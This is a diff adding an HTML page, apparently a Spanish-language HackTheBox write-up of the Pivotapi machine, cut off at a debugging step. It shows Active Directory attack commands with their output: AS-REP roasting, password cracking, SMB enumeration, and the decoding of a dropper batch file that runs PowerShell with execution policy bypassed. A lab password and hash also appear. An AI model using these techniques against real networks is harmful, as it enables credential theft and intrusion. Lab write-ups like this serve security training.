@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Pivotapi</title>
+
+  <meta name="description" content="Resolución de la máquina Pivotapi de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Pivotapi">
+  <meta name="twitter:description" content="Resolución de la máquina Pivotapi de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/pivotapi.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Pivotapi">
+  <meta property="og:description" content="Resolución de la máquina Pivotapi de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/pivotapi.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/pivotapi.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Pivotapi" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-kaorz">Access - kaorz</a></li>
+        <li><a href="#access-svc_mssql">Acces - svc_mssql</a></li>
+        <li><a href="#shell-svc_mssql">Shell - svc_mssql</a></li>
+        <li><a href="#shell-3v4s10n">Shell - 3v4s10n</a></li>
+        <li><a href="#shell-dr.zaiuss">Shell - dr.zaiuss</a></li>
+        <li><a href="#shell-superfume">Shell - superfume</a></li>
+        <li><a href="#shell-jari">Shell - jari</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#altern1-administrator">Alternativa 1 - Administrator</a></li>
+        <li><a href="#altern2-administrator">Alternativa 2 - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/pivotapi.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Pivotapi</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, en Windows es recomendable usar el parametro <code class="language-plaintext highlighter-rouge">-Pn</code> para forzar el escaneo aunque no reciba respuesta de los paquetes ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.240 -Pn
+Nmap scan report for 10.10.10.240  
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+9389/tcp  open  adws
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49702/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">licordebellota.htb</code> ademas del nombre que es <code class="language-plaintext highlighter-rouge">PIVOTAPI</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.240
+</span><span class="az">SMB         </span><span class="p">10.10.10.240     445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es <code class="language-plaintext highlighter-rouge">PIVOTAPI</code> como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.240 licordebellota.htb pivotapi.licordebellota.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que esta abierto iniciarmos por conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code>, en este caso admite la autenticacion por defecto del usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ftp </span><span class="p">licordebellota.htb
+Connected to licordebellota.htb.
+220 Microsoft FTP Service
+Name (licordebellota.htb:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.  
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro de ftp encontramos varios archivos, principalmente archivos de extensión <code class="language-plaintext highlighter-rouge">pdf</code> sobre binarios, cambiamos el modo a <code class="language-plaintext highlighter-rouge">bin</code> y descargamos todos los archivos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ftp> dir
+229 Entering Extended Passive Mode (|||53092|)
+125 Data connection already open; Transfer starting.
+02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
+02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf  
+02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
+02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
+08-08-20  01:18PM               219091 notes1.pdf
+08-08-20  01:34PM               279445 notes2.pdf
+08-08-20  01:41PM                  105 README.txt
+02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
+226 Transfer complete.
+ftp> bin
+200 Type set to I.
+ftp> prompt off
+Interactive mode off.
+ftp> mget *
+local: 10.1.1.414.6453.pdf remote: 10.1.1.414.6453.pdf
+......................................................  
+ftp></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-kaorz">
+<br><h3 class="post-title">Access - kaorz</h3><br>
+
+<p class="plain-text">Mirando los metadatos con <code class="language-plaintext highlighter-rouge">exiftool</code> de un pdf encontramos un campo <code class="language-plaintext highlighter-rouge">Creator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ exiftool </span><span class="p">notes2.pdf
+ExifTool Version Number         : 12.63
+File Name                       : notes2.pdf
+Directory                       : .
+File Size                       : 279 kB
+File Modification Date/Time     : 2020:08:08 07:34:25-04:00
+File Access Date/Time           : 2023:07:08 13:34:19-04:00
+File Inode Change Date/Time     : 2023:07:08 13:34:19-04:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 5
+XMP Toolkit                     : Image::ExifTool 12.03
+Creator                         : Kaorz
+Publisher                       : LicorDeBellota.htb
+Producer                        : cairo 1.10.2 (http://cairographics.org)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">exiftool</code> dumpeamos el campo <code class="language-plaintext highlighter-rouge">Creator</code> de todos los archivos pdf, nos encontramos con 2 posibles <code class="language-plaintext highlighter-rouge">usuarios</code> validos los cuales son <code class="language-plaintext highlighter-rouge">kaorz</code> y <code class="language-plaintext highlighter-rouge">alex</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ exiftool </span><span class="p">-Creator *.pdf
+======== 10.1.1.414.6453.pdf
+Creator                         : Microsoft Word
+======== 28475-linux-stack-based-buffer-overflows.pdf
+Creator                         : Microsoft® Word 2013
+======== BHUSA09-McDonald-WindowsHeap-PAPER.pdf
+Creator                         : byron gronseth
+======== ExploitingSoftware-Ch07.pdf
+======== notes1.pdf
+Creator                         : cairo 1.10.2 (http://cairographics.org)  
+======== notes2.pdf
+Creator                         : Kaorz
+======== RHUL-MA-2009-06.pdf
+Creator                         : alex
+    7 image files read</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al validar los usuarios con <code class="language-plaintext highlighter-rouge">kerbrute</code> solo el usuario <code class="language-plaintext highlighter-rouge">kaorz</code> existe en el dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d licordebellota.htb --dc pivotapi.licordebellota.htb users.txt  
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>       pivotapi.licordebellota.htb:88
+</span><span class="ve">
+>  [+] VALID USERNAME:   kaorz@licordebellota.htb
+</span><span class="p">>  Done! Tested 2 usernames (1 valid) in 0.106 seconds</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos un <code class="language-plaintext highlighter-rouge">usuario</code> valido, dentro de los posibles ataques a probar esta el <code class="language-plaintext highlighter-rouge">ASREPRoast</code> usando GetNPUsers y al ser vulnerable nos devuelve un <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">licordebellota.htb/kaorz -no-pass 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT for kaorz
+$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:bd314edcba1af49ed3d17c2529b98e3a$202f3d07214e047bd3622a034ece4d643b704c86668b216fc69ae331a47269eba7b14eb33270fea257adb1fa057f987ada9b2d143b449716d5ea6c8411db5afe56d089df16996fe241574dc124738b90c49b7afe1ac2f2a328f4c77b5971ee08ee098a11bb28355d568cc961424a1d8b8c9c126ef20ddf5e300d6c76cfc99f8428447e310ee4f5f1b228e29129ebef950925c9e183423201dc765e47aca4cc7417516bf366904f04ee40f9eb6520cf61a34910709570f933216262a3980a6fb30e5b2bb2bbe6708cd62ab19fa6787ae3d5cd82996b679fd544bc21700f6853d2ed10b51d96901e8201f6391dfcaa7c79942699470410bef7  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">john</code> logramos crackear el hash y obtener la contraseña del usuario <code class="language-plaintext highlighter-rouge">kaorz</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash            
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Roper4155</span><span class="p">        (</span><span class="am">$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos comprobar que las credenciales son validas, ahora al listar los recursos <code class="language-plaintext highlighter-rouge">SMB</code> tenemos privilegios <code class="language-plaintext highlighter-rouge">READ</code> (de lectura) en varios de ellos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u kaorz -p Roper4155
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\kaorz:Roper4155 
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u kaorz -p Roper4155 --shares
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\kaorz:Roper4155 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">ADMIN$                          Admin remota
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">C$                              Recurso predeterminado
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">IPC$            READ            IPC remota
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">NETLOGON        READ            Recurso compartido del servidor de inicio de sesión 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">SYSVOL          READ            Recurso compartido del servidor de inicio de sesión</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-svc_mssql">
+<br><h3 class="post-title">Access - svc_mssql</h3><br>
+
+<p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">smbclient</code> al recurso compartido <code class="language-plaintext highlighter-rouge">NETLOGON</code>, dentro de ella tenemos un directorio <code class="language-plaintext highlighter-rouge">HelpDesk</code> que contiene 2 archivos <code class="language-plaintext highlighter-rouge">msg</code> y un archivo <code class="language-plaintext highlighter-rouge">exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">licordebellota.htb/kaorz:Roper4155@pivotapi.licordebellota.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use NETLOGON
+# ls
+drw-rw-rw-          0  Sat Aug  8 06:42:28 2020 .
+drw-rw-rw-          0  Sat Aug  8 06:42:28 2020 ..
+drw-rw-rw-          0  Sun Aug  9 11:40:36 2020 HelpDesk
+# cd HelpDesk
+# ls
+drw-rw-rw-          0  Sun Aug  9 11:40:36 2020 .
+drw-rw-rw-          0  Sun Aug  9 11:40:36 2020 ..
+-rw-rw-rw-    1854976  Fri Feb 19 06:33:15 2021 Restart-OracleService.exe
+-rw-rw-rw-      24576  Sun Aug  9 11:40:36 2020 Server MSSQL.msg
+-rw-rw-rw-      26112  Sun Aug  9 07:45:39 2020 WinRM Service.msg
+# mget *
+[*] Downloading Restart-OracleService.exe
+[*] Downloading Server MSSQL.msg
+[*] Downloading WinRM Service.msg
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Los 2 archivos con extensión <code class="language-plaintext highlighter-rouge">msg</code> podemos abrirlos con <code class="language-plaintext highlighter-rouge">outlook</code>, el primero nos dice que el servicio <code class="language-plaintext highlighter-rouge">winrm</code> esta deshabilitado en el equipo y el segundo nos dice que en el año <code class="language-plaintext highlighter-rouge">2020</code> se ha migrado de <code class="language-plaintext highlighter-rouge">oracle</code> a <code class="language-plaintext highlighter-rouge">mssql</code> a diferencia del año <code class="language-plaintext highlighter-rouge">2010</code></p>
+<a href="/htb/pivotapi/1.png" target="_blank"><div><p><img src="/htb/pivotapi/1.png"></p></div></a>
+
+<p class="plain-text">Al ejecutar el archivo <code class="language-plaintext highlighter-rouge">exe</code> este sale sin mostrar nada interesante, usando <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">procmon</a> podemos monitorear las acciones que este hace, al parecer crea un archivo de extensión <code class="language-plaintext highlighter-rouge">bat</code> en el directorio <code class="language-plaintext highlighter-rouge">Temp</code>, pero al revisar el directorio este no existe</p>
+<a href="/htb/pivotapi/2.png" target="_blank"><div><p><img src="/htb/pivotapi/2.png"></p></div></a>
+
+<p class="plain-text">Ya que probablemente lo esta <code class="language-plaintext highlighter-rouge">eliminando</code> antes de terminar la ejecución del exe, modificaremos los <code class="language-plaintext highlighter-rouge">permisos</code> en esta carpeta para que no pueda eliminar nada</p>
+<a href="/htb/pivotapi/3.png" target="_blank"><div><p><img src="/htb/pivotapi/3.png"></p></div></a>
+
+<p class="plain-text">Al ejecutar de nuevo el <code class="language-plaintext highlighter-rouge">exe</code> como no puede borrar los archivos nos encontramos con ellos en el directorio <code class="language-plaintext highlighter-rouge">Temp</code>, en este caso son un archivo tmp y un archivo <code class="language-plaintext highlighter-rouge">bat</code></p>
+<a href="/htb/pivotapi/4.png" target="_blank"><div><p><img src="/htb/pivotapi/4.png"></p></div></a>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">bat</code> inicia haciendo un par de comprobaciones de usuario, despues guarda una data en <code class="language-plaintext highlighter-rouge">base64</code> en un archivo <code class="language-plaintext highlighter-rouge">oracle.txt</code>, despues crea un archivo de <code class="language-plaintext highlighter-rouge">powershell</code> que lo convierte en un <code class="language-plaintext highlighter-rouge">exe</code> y lo ejecuta, finalmente borra los archivos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">@shift</span><span class="p"> /</span><span class="mi">0
+</span><span class="o">@echo </span><span class="p">off
+
+</span><span class="o">if </span><span class="p">%username% </span><span class="o">== </span><span class="p">cybervaca </span><span class="o">goto </span><span class="p">correcto
+</span><span class="o">if </span><span class="p">%username% </span><span class="o">== </span><span class="p">frankytech </span><span class="o">goto </span><span class="p">correcto
+</span><span class="o">if </span><span class="p">%username% </span><span class="o">== </span><span class="p">ev4si0n </span><span class="o">goto </span><span class="p">correcto
+</span><span class="o">goto </span><span class="p">error
+
+:</span><span class="na">correcto</span><span class="p">
+</span><span class="o">echo </span><span class="p">TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">></span><span class="p"> c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYKAAAAAAAAAAAAAAAAAPAALwILAgIfAG </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+........................................................................................................
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+
+</span><span class="o">echo </span><span class="p">$salida </span><span class="o">= </span><span class="p">$</span><span class="mi">null</span><span class="p">; $fichero = (</span><span class="no">Get-Content </span><span class="p">C:\ProgramData\oracle.txt) ; </span><span class="o">foreach</span><span class="p"> ($linea </span><span class="o">in</span><span class="p"> $fichero) {$salida </span><span class="o">+= </span><span class="p">$linea }; $salida </span><span class="o">= </span><span class="p">$salida.</span><span class="no">Replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="s">""</span><span class="p">); [</span><span class="no">System.IO.File</span><span class="p">]::WriteAllBytes(</span><span class="s">"c:\programdata\restart-service.exe"</span><span class="p">, [</span><span class="no">System.Convert</span><span class="p">]::FromBase64String($salida)) </span><span class="o">> </span><span class="p">c:\programdata\monta.ps1  
+powershell.exe -exec bypass -file c:\programdata\monta.ps1
+</span><span class="o">del </span><span class="p">c:\programdata\monta.ps1
+</span><span class="o">del </span><span class="p">c:\programdata\oracle.txt
+c:\programdata\restart-service.exe
+</span><span class="o">del </span><span class="p">c:\programdata\restart-service.exe
+
+:</span><span class="na">error</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos modificar el <code class="language-plaintext highlighter-rouge">bat</code> para quitar las lineas donde hace <code class="language-plaintext highlighter-rouge">comprobaciones</code> y borra archivos, para asi poder ver en que consisten los <code class="language-plaintext highlighter-rouge">archivos</code> que este crea</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">@echo </span><span class="p">off
+
+</span><span class="o">echo </span><span class="p">TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">></span><span class="p"> c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYKAAAAAAAAAAAAAAAAAPAALwILAgIfAG </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+........................................................................................................
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+</span><span class="o">echo </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA </span><span class="o">>> </span><span class="p">c:\programdata\oracle.txt
+
+</span><span class="o">echo </span><span class="p">$salida </span><span class="o">= </span><span class="p">$</span><span class="mi">null</span><span class="p">; $fichero = (</span><span class="no">Get-Content </span><span class="p">C:\ProgramData\oracle.txt) ; </span><span class="o">foreach</span><span class="p"> ($linea </span><span class="o">in</span><span class="p"> $fichero) {$salida </span><span class="o">+= </span><span class="p">$linea }; $salida </span><span class="o">= </span><span class="p">$salida.</span><span class="no">Replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="s">""</span><span class="p">); [</span><span class="no">System.IO.File</span><span class="p">]::WriteAllBytes(</span><span class="s">"c:\programdata\restart-service.exe"</span><span class="p">, [</span><span class="no">System.Convert</span><span class="p">]::FromBase64String($salida)) </span><span class="o">> </span><span class="p">c:\programdata\monta.ps1  
+powershell.exe -exec bypass -file c:\programdata\monta.ps1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar nuestra version modificada del script de extensión <code class="language-plaintext highlighter-rouge">bat</code> nos crea varios archivos, el <code class="language-plaintext highlighter-rouge">txt</code>, el <code class="language-plaintext highlighter-rouge">ps1</code> y un <code class="language-plaintext highlighter-rouge">exe</code> todo en el directorio <code class="language-plaintext highlighter-rouge">C:\ProgramData</code></p>
+<a href="/htb/pivotapi/6.png" target="_blank"><div><p><img src="/htb/pivotapi/6.png"></p></div></a>
+
+<p class="plain-text">Este archivo <code class="language-plaintext highlighter-rouge">exe</code> tampoco nos deja muy claro que es lo que hace, asi que lo abriremos usando <a href="http://www.rohitab.com/apimonitor">Api Monitor</a> podemos correr el programa y ver las acciones que realiza por detras, esto es similar a lo que hace la herramienta <code class="language-plaintext highlighter-rouge">ltrace</code> en Linux</p>
+<a href="/htb/pivotapi/7.png" target="_blank"><div><p><img src="/htb/pivotapi/7.png"></p></div></a>
+
+<p class="plain-text">Después de ver un poco las acciones vemos que con <code class="language-plaintext highlighter-rouge">CreateProcessWithLogonW</code> se autentica para crear un proceso usando las credenciales de <code class="language-plaintext highlighter-rouge">svc_oracle</code>, esta es una de las formas para ver la contraseña y obtener posibles <code class="language-plaintext highlighter-rouge">credenciales</code> validas</p>
+<a href="/htb/pivotapi/8.png" target="_blank"><div><p><img src="/htb/pivotapi/8.png"></p></div></a>
+
+<p class="plain-text">Otra forma mas guapa es usando <a href="https://x64dbg.com/">x64dbg</a>, pero para que no termine el programa al correrlo en las preferencias haremos que haga un <code class="language-plaintext highlighter-rouge">breakpoint</code> antes de la salida<p>
+<a href="/htb/pivotapi/15.png" target="_blank"><div><p><img src="/htb/pivotapi/15.png"></p></div></a>
+
+<p class="plain-text">De esta manera corremos el programa y se detiene antes de salir con el <code class="language-plaintext highlighter-rouge">banner</code></p>
+<a href="/htb/pivotapi/16.png" target="_blank"><div><p><img src="/htb/pivotapi/16.png"></p></div></a>
+
